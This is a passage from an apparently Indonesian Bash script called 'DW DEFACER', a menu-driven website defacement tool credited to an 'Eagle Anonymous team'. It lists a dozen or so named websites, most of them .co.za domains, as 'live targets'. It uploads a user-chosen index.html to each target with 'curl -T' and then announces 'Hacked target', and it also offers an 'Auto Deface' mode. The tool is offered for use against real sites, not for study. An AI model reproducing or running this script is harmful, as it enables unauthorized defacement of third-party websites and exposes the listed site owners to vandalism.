...
echo
echo
toilet -f future "    DW DEFACER" | lolcat
echo
echo $red">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo $red
figlet -f future "Eagle Anonymous team"
echo
echo $red">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
echo
echo $red"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Index Website"$cyan
echo $red"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Follow admin"$cyan
echo $red"	~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Auto Deface Website"$cyan
echo
echo $red"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
echo
echo $white"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"TUTORIAL & LIVE TARGET"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
echo $white"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
echo $white"=============================================================="
echo
echo $white "╭─"$yellow"Dw"$cyan" ~/Dw"$white
read -p " ╰─$ "  apaan
echo
if [ $apaan = "A" ] || [ $apaan = "a" ]
then
...
echo
echo
toilet -f future "Tebas Index website" | lolcat
echo
echo $red "Simpan script deface di /sdcard "
echo
echo $red "List Target"
echo $red "http://contsol.co.za"
echo $red "http://colourfactory.co.za"
echo $red "http://chillibitez.co.za"
echo $red "http://chasingfantasia.com"
echo $red "http://centraltech.co.za"
echo $red "http://cblandscapes.co.za"
echo $red "http://crimsonmonkeyweb.com"
echo $red "http://kevinbutho.com"
echo $red "http://prorepafrica.com"
echo $red "http://xposurephotography.co.za"
...
echo $white "http://bitsandpieces.co.za"
...
echo $green "╭─"$red"DwDefacer"$white" ~/load"$white
read -p " ╰─$ "  target
echo
echo $red "Masukan script /sdcard "
echo $green "╭─"$red"DwDefacer"$white" ~/Nama script harus index.html"$white
read -p " ╰─$ "  script
curl -T /storage/emulated/0/$script $target
echo $red "["$red"Hacked target"$red"]"$red"～～～＞"$red" $target"
echo
...
if [ $apaan = "B" ] || [ $apaan = "b" ]
then
xdg-open https://www.instagram.com/_dewabaskara_10/
read -p "[B/Q] : " back
fi
...
echo
echo $red
toilet -f future "Deface Auto" | lolcat
echo $cyan "Website added 20"
echo
echo
echo
echo
echo "Masukan Script...."
echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white                               
read -p " ╰─$ " script
echo
echo
...
echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
read -p " ╰─$ " target5
...
echo $red"Author   : Dw			"
echo $purple"Gthub   : https://github.com/LenteraHacker"
echo $white"Youtube  : https://youtube.com/EagleAnonymous"
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] " back
fi
...
if [ $apaan = "T" ] || [ $apaan = "t" ]
then
echp $red "bacot nub anda memang"
echo
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] " back
fi
